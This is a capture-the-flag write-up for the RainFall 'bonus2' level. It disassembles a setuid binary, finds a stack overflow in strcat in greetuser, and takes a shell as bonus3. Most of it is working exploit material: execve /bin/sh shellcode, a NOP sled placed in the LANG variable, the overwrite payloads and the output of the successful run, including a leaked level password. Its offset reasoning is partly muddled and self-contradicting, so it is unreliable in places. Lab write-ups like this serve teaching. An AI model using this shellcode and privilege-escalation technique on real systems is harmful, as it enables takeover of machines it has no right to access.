# Bonus2 - Environment Variable Exploitation
## Initial Analysis
### 1. Examine the Binary
```bash
bonus2@RainFall:~$ ls -la
total 8
-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
bonus2@RainFall:~$ file bonus2
bonus2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5a8b7f4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a, not stripped
```
**Key observations:**

setuid and setgid binary (s flags in permissions)

Owned by bonus3 user

When executed, runs with bonus3 privileges

No RELRO, no stack canary, NX disabled, no PIE - perfect for exploitation

### 2. Test Basic Execution
```bash
bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$ ./bonus2 test
bonus2@RainFall:~$ ./bonus2 hello world
Hello helloworld
```
**Observations:**

Program takes two command-line arguments

Prints a greeting followed by the concatenated arguments

Default greeting is "Hello " (English)

## Reverse Engineering
### 3. Function Analysis
```bash
bonus2@RainFall:~$ gdb bonus2
(gdb) info functions
All defined functions:
0x08048360  memcmp@plt
0x08048370  strcat@plt
0x08048380  getenv@plt
0x08048390  puts@plt
0x080483c0  strncpy@plt
0x08048484  greetuser
0x08048529  main
```
### 4. Disassembling main
```assembly
(gdb) disas main
Key findings in main():

assembly
0x08048538: cmpl   $0x3,0x8(%ebp)        # Check for 3 arguments (argv[0], argv[1], argv[2])
0x0804853c: je     0x8048548              # Jump if argc == 3
0x0804853e: mov    $0x1,%eax              # Otherwise return 1
0x08048543: jmp    0x8048630

0x08048548: lea    0x50(%esp),%ebx        # Buffer at esp+80 (76 bytes)
0x0804854c: mov    $0x0,%eax              # Zero out buffer
0x08048551: mov    $0x13,%edx             # 19 DWORDs = 76 bytes
0x0804855a: rep stos %eax,%es:(%edi)

# First strncpy - copy argv[1] to buffer (max 40 bytes)
0x08048577: call   0x80483c0 <strncpy@plt>

# Second strncpy - copy argv[2] to buffer+40 (max 32 bytes)
0x0804859a: call   0x80483c0 <strncpy@plt>

# Get LANG environment variable
0x080485a6: call   0x8048380 <getenv@plt>
0x080485ab: mov    %eax,0x9c(%esp)        # Store LANG pointer

# Check if LANG exists
0x080485b2: cmpl   $0x0,0x9c(%esp)
0x080485ba: je     0x8048618               # Skip if no LANG

# Compare with "fi" (Finnish)
0x080485bc: movl   $0x2,0x8(%esp)          # Length 2
0x080485c4: movl   $0x804873d,0x4(%esp)    # "fi"
0x080485cc: mov    0x9c(%esp),%eax
0x080485d6: call   0x8048360 <memcmp@plt>
0x080485db: test   %eax,%eax
0x080485dd: jne    0x80485eb
0x080485df: movl   $0x1,0x8049988          # Set flag = 1 for Finnish
0x080485e9: jmp    0x8048618

# Compare with "nl" (Dutch)
0x080485eb: movl   $0x2,0x8(%esp)          # Length 2
0x080485f3: movl   $0x8048740,0x4(%esp)    # "nl"
0x08048602: call   0x8048360 <memcmp@plt>
0x0804860a: test   %eax,%eax
0x0804860c: jne    0x8048618
0x0804860e: movl   $0x2,0x8049988          # Set flag = 2 for Dutch

# Copy buffer to stack for greetuser (76 bytes)
0x08048618: mov    %esp,%edx
0x0804861a: lea    0x50(%esp),%ebx
0x0804861e: mov    $0x13,%eax              # 19 DWORDs = 76 bytes
0x08048629: rep movsl %ds:(%esi),%es:(%edi)

# Call greetuser
0x0804862b: call   0x8048484 <greetuser>
```
### 5. Disassembling greetuser
```bash
(gdb) disas greetuser
assembly
0x0804848a: mov    0x8049988,%eax        # Load language flag
0x0804848f: cmp    $0x1,%eax             # Check for Finnish
0x08048492: je     0x80484ba             # Jump to Finnish greeting
0x08048494: cmp    $0x2,%eax             # Check for Dutch
0x08048497: je     0x80484e9             # Jump to Dutch greeting
0x08048499: test   %eax,%eax             # Default (English)
0x0804849b: jne    0x804850a
```
**English greeting** (flag=0)
```
0x0804849d: mov    $0x8048710,%edx       # "Hello " (6 bytes)
0x080484a2: lea    -0x48(%ebp),%eax      # Local buffer (72 bytes)
```
**... copy greeting to local buffer**

**Finnish greeting** (flag=1)
```
0x080484ba: mov    $0x8048717,%edx       # "Hyvää päivää " (14 bytes)
**... copy greeting to local buffer**
```

**Dutch greeting** (flag=2)
```
0x080484e9: mov    $0x804872a,%edx       # "Goedemiddag! " (12 bytes)
**... copy greeting to local buffer**
```

```
0x08048517: call   0x8048370 <strcat@plt>  # Append user input! ⚡
0x08048522: call   0x8048390 <puts@plt>    # Print result
```
**Greeting strings:**

Language	Flag	Greeting	Length (bytes)
Default	0	"Hello "	6
Finnish	1	"Hyvää päivää "	14
Dutch	2	"Goedemiddag! "	12
### 6. Examining the Greeting Strings
```bash
(gdb) x/s 0x8048710
0x8048710:      "Hello "

(gdb) x/s 0x8048717
0x8048717:      "Hyvää päivää "

(gdb) x/s 0x804872a
0x804872a:      "Goedemiddag! "
```
## The Vulnerability
### 7. Buffer Overflow in greetuser
In greetuser(), a local buffer of 72 bytes (at ebp-0x48) receives:

First: The greeting string via strcpy (6-14 bytes)

Second: User input via strcat (up to 76 bytes from main)

The problem: The local buffer is only 72 bytes, but we can append up to 76 bytes after the greeting!

```text
Local buffer layout in greetuser (72 bytes):

[ greeting ][ user input ][ saved ebp ][ return address ]
  6-14 B     up to 76 B     4 B          4 B
              ╰───────────────── overflow can reach here!
```
### 8. Calculating Buffer Size
The local buffer is at ebp-0x48 (72 bytes):

72 bytes total buffer

Greeting takes 6-14 bytes

Remaining space = 72 - greeting_length

Anything beyond this overflows into saved ebp and return address

### 9. Finding the Offsets
We need to find exactly how many bytes from our input reach the return address.

For Dutch (LANG=nl):

```bash
bonus2@RainFall:~$ export LANG=nl
bonus2@RainFall:~$ gdb bonus2
(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()
Pattern analysis:

0x38614137 = "8aA7" in ASCII
```

In the De Bruijn pattern, this corresponds to 23 bytes

Offset for Dutch = 23 bytes

For Finnish (LANG=fi):


```bash
bonus2@RainFall:~$ export LANG=fi
(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
0x41366141 = "A6aA" in ASCII
```

This corresponds to 18 bytes in the pattern

Offset for Finnish = 18 bytes

For English (no LANG):

```bash
(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB
```

Program runs normally - no crash!
English greeting (6 bytes) is too short to cause overflow with our input length.

### 10. Why Different Offsets?
The offset to return address depends on the greeting length:

```text
Stack layout in greetuser:

Higher addresses
┌──────────────────────────┐
│   return address         │ ← 4 bytes (OUR TARGET)
├──────────────────────────┤
│   saved ebp              │ ← 4 bytes
├──────────────────────────┤
│   local_buffer (72 bytes)│
│   ┌───────────────────┐  │
│   │ greeting (X bytes)│  │
│   ├───────────────────┤  │
│   │ user input (rest) │  │
│   └───────────────────┘  │
└──────────────────────────┘
Lower addresses
```

Offset to return address = 72 - greeting_length + 4 (saved ebp)

Dutch: 72 - 12 + 4 = 64 bytes total, but our input starts after greeting
       So from start of our input: 64 - 12 = 52? Wait, careful...
Better calculation:

Total bytes to overwrite return address = 72 (buffer) + 4 (saved ebp) = 76 bytes

Greeting occupies first X bytes

Our input needs: 76 - X bytes to reach return address

Language	Greeting (X)	Bytes needed	Offset from start of our input
English	6	70	> 40+32 (our max) → no overflow
Finnish	14	62	62 - 40 = 22? Wait, our pattern shows 18
Dutch	12	64	64 - 40 = 24? Pattern shows 23
The exact offsets from pattern testing are:

Dutch: 23 bytes from start of argv[2]

Finnish: 18 bytes from start of argv[2]

## Exploitation Strategy
### 11. The Plan
We need to:

Set LANG to either Finnish or Dutch (to get longer greeting)

Place shellcode somewhere accessible (environment variable)

Craft argv[2] to overwrite return address with shellcode address

Use argv[1] as padding (40 bytes of 'A')

### 12. Shellcode Selection
Using 21-byte execve shellcode (no NULL bytes):

```assembly
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
This shellcode executes /bin/sh.
```
### 13. Shellcode Placement - The Genius Trick
Instead of putting shellcode in argv (limited size), we put it in the LANG environment variable:

```bash
export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
This gives us:

"nl" (2 bytes) - triggers Dutch greeting

100 bytes of NOP sled (\x90)

21 bytes of shellcode

Total space: ~123 bytes - plenty for reliable exploitation!
```
### 14. Finding the Return Address
We need an address somewhere in the NOP sled:

```bash
bonus2@RainFall:~$ gdb bonus2
(gdb) b *main+125
Breakpoint 1 at 0x804862b
(gdb) run $(python -c 'print "A"*40') bla
...
Breakpoint 1, 0x0804862b in main ()
(gdb) x/20s *((char**)environ)
0xbffffeb4:      "nl", '\220' <repeats 100 times>, "j\vX\231Rh//shh/bin\211\343\1\311̀"
0xbfffff2a:      "SSH_CLIENT=::1 37382 22"
0xbfffff4a:      "SSH_TTY=/dev/pts/2"
...
```
Choose an address in the NOP sled, e.g., 0xbffffeb4 + 50 = 0xbffffee6

### 15. Crafting the Payload
For Dutch (offset 23):

```bash
argv[1] = "A" * 40
argv[2] = "B" * 23 + "\xe6\xfe\xff\xbf"
For Finnish (offset 18):
```
```bash
argv[1] = "A" * 40
argv[2] = "B" * 18 + "\xe6\xfe\xff\xbf"
```
### 16. Final Exploit
```bash
# Set up environment with shellcode (Dutch version)
bonus2@RainFall:~$ export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')

# Verify LANG is set
bonus2@RainFall:~$ echo $LANG | head -c 50
nl����������������������������������������������������������������

# Run the exploit
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe6\xfe\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB���
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ exit
```
